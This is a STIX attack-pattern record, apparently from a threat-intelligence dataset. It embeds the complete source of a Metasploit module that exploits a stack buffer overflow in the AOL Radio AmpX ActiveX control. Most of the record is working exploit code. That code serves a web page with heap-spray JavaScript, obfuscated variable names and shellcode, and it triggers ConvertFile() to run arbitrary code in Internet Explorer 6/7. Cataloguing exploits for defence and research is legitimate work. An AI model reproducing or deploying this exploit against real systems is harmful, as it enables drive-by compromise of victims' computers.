{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c68aaaa-feab-46c4-b6c1-7c2c4ec610b3",
    "created": "2024-08-14T16:43:11.905051Z",
    "modified": "2024-08-14T16:43:11.905055Z",
    "name": "AOL Radio AmpX ActiveX Control ConvertFile() Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in AOL IWinAmpActiveX class (AmpX.dll) version 2.4.0.6 installed via AOL Radio website. By setting an overly long value to 'ConvertFile()', an attacker can overrun a buffer and execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/aol_ampx_convertfile.rb",
            "external_id": "aol_ampx_convertfile.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AOL Radio AmpX ActiveX Control ConvertFile() Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in AOL IWinAmpActiveX\n        class (AmpX.dll) version 2.4.0.6 installed via AOL Radio website.\n        By setting an overly long value to 'ConvertFile()', an attacker can overrun\n        a buffer and execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>',\t\t# Original exploit [see References]\n          'Trancer <mtrancer[at]gmail.com>'\t# Metasploit implementation\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '54706' ],\n          [ 'BID', '35028' ],\n          [ 'EDB', '8733' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista SP0-SP1 / IE 6.0 SP0-2 & IE 7.0', { 'Offset' => 250, 'Ret' => 0x0C0C0C0C } ]\n        ],\n      'DisclosureDate' => '2009-05-19',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops \t  = Rex::Text.to_unescape([target.ret].pack('V'))\n    ret  \t  = Rex::Text.uri_encode([target.ret].pack('L'))\n    blocksize = 0x40000\n    fillto    = 500\n    offset \t  = target['Offset']\n\n    # Randomize the javascript variable names\n    ampx\t     = rand_text_alpha(rand(100) + 1)\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n    j_counter    = rand_text_alpha(rand(30) + 2)\n    j_ret        = rand_text_alpha(rand(100) + 1)\n    j_eax        = rand_text_alpha(rand(100) + 1)\n    j_bof        = rand_text_alpha(rand(100) + 1)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Build out the message\n    content = %Q|\n<html>\n<OBJECT classid='clsid:FE0BD779-44EE-4A4B-AA2E-743C63F2E5E6' id='#{ampx}'></OBJECT>\n<script language='javascript'>\n  #{j_shellcode}=unescape('#{shellcode}');\n  var #{randnop} = \"#{nops}\";\n  #{j_nops}=unescape(#{randnop});\n  #{j_headersize}=20;\n  #{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;\n  while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};\n  #{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});\n  #{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});\n  while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};\n  #{j_memory}=new Array();\n  for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};\n  #{j_eax}='';\n  for(#{j_counter}=0;#{j_counter}<=350;#{j_counter}++)#{j_eax}+=unescape('%FF%FF%FF%FF');\n  #{j_ret}='';\n  for(#{j_counter}=0;#{j_counter}<=#{offset};#{j_counter}++)#{j_ret}+=unescape('#{ret}');\n  #{j_bof}=#{j_eax}+#{j_ret};\n  #{ampx}.ConvertFile(#{j_bof},1,1,1,1,1);\n  #{ampx}.ConvertFile(#{j_bof},1,1,1,1,1);\n  #{ampx}.ConvertFile(#{j_bof},1,1,1,1,1);\n  #{ampx}.ConvertFile(#{j_bof},1,1,1,1,1);\n</script>\n</html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-05-19",
    "x_mitre_platforms": [
        "win'"
    ]
}